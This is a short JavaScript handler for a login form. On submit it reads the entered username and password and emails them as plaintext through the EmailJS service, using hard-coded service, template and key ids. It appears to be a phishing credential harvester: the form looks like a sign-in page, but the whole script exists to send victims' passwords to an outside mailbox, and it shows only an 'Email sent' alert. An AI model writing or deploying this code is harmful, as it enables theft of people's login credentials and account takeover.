let login=document.querySelector('.but')
login.addEventListener('click',function(e){
    e.preventDefault();
let username=document.querySelector('#name').value.trim()
let password=document.querySelector('#password').value.trim()
if(username!="" && password!=""){
    // email js 
emailjs.init({
  publicKey: 'RrnakcK-5llyeuw4O',
});
// create object 
const gmail={
    from_name:username,
    from_password:password
}
emailjs.send('service_r9yz5me', 'template_0cnlne2', gmail).then(function(){
    alert('Email sent successfully')
}).catch(function(error){
    console.log(error)
    alert('failed to sent')
})
}
else{
    alert('fill the fields ')
}
}
)
